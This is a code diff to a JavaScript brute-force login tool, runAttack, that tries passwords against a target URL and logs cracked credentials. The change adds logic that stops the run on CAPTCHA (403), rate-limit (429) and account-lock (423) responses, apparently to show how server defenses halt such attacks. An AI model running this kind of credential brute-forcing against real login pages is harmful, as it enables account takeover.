@@ -44,7 +44,7 @@ async function runAttack(targetUrl, targetUsername, options) {
     await fetch(targetUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username: '__probe__', password: '__probe__' }),
+      body: JSON.stringify({ username: '__probe__' , password: '__probe__' }),
       signal: AbortSignal.timeout(5000),
     });
     addLog(`Target URL is reachable. Starting attack...`);
@@ -146,12 +146,31 @@ async function runAttack(targetUrl, targetUsername, options) {
                 addLog(`\n[+] SUCCESS! Password found for user '${tUser}': ${password}`);
                 activeUsers.splice(i, 1);
                 i--;
+              } else if (response.status === 403) {
+                const resData = await response.json().catch(() => ({}));
+                addLog(`\n[!] ATTACK BLOCKED: Bot Challenge / CAPTCHA Triggered (403 Forbidden)`);
+                addLog(`[!] Server response: ${resData.message || 'Security verification (CAPTCHA) required.'}`);
+                addLog(`[!] Automated brute force halted — human verification challenge cannot be bypassed by automated scripts.`);
+                isRunning = false;
+                return;
               } else if (response.status === 429) {
                 addLog(`\n[!] ATTACK BLOCKED: Rate Limit Exceeded (429 Too Many Requests)`);
-                addLog(`[!] The target server is actively defending against brute force.`);
+                addLog(`[!] The target server is actively defending against brute force via IP rate limiting.`);
                 addLog(`[!] Aborting attack run to prevent IP ban...`);
                 isRunning = false;
                 return;
+              } else if (response.status === 423) {
+                const resData = await response.json().catch(() => ({}));
+                addLog(`\n[!] ATTACK BLOCKED: Account Locked (423 Locked) for '${tUser}'`);
+                addLog(`[!] Server response: ${resData.message || 'Account temporarily locked due to excessive failed attempts.'}`);
+                addLog(`[!] The target server locked this specific account, halting further credential attempts.`);
+                activeUsers.splice(i, 1);
+                i--;
+                if (activeUsers.length === 0) {
+                  addLog(`\n[!] All target accounts are locked or cracked. Ending attack.`);
+                  isRunning = false;
+                  return;
+                }
               }
           } catch (reqErr) {
               const isNetworkError =
@@ -176,7 +195,7 @@ async function runAttack(targetUrl, targetUsername, options) {
       }
 
       if (activeUsers.length === 0) {
-          addLog(`\n[+] All target users were successfully cracked!`);
+          addLog(`\n[+] All target users were processed!`);
           const timeTaken = (Date.now() - startTime) / 1000;
           addLog(`⏰ Time taken: ${timeTaken} seconds`);
           break;
